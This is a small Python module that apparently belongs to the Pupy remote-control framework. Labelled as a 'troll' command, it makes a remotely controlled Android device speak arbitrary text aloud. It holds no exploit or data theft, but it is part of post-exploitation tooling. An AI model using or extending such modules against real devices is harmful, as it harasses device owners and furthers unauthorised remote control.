# -*- coding: utf-8 -*-

from pupylib.PupyModule import config, PupyModule, PupyArgumentParser

__class_name__="AndroidTTS"

@config(compat="android", cat="troll", tags=["speech", "speak", "sound"])
class AndroidTTS(PupyModule):
    """ Use Android text to speach to say something :) """

    dependencies=['pupydroid.text_to_speech']

    @classmethod
    def init_argparse(cls):
        cls.arg_parser = PupyArgumentParser(prog="tts", description=cls.__doc__)
        cls.arg_parser.add_argument('--lang', default='US', help='change the locale')
        cls.arg_parser.add_argument('text', help='text to speak out loud')

    def run(self, args):
        self.client.conn.modules['pupydroid.text_to_speech'].speak(args.text, lang=args.lang)
        self.success("The truth has been spoken !")
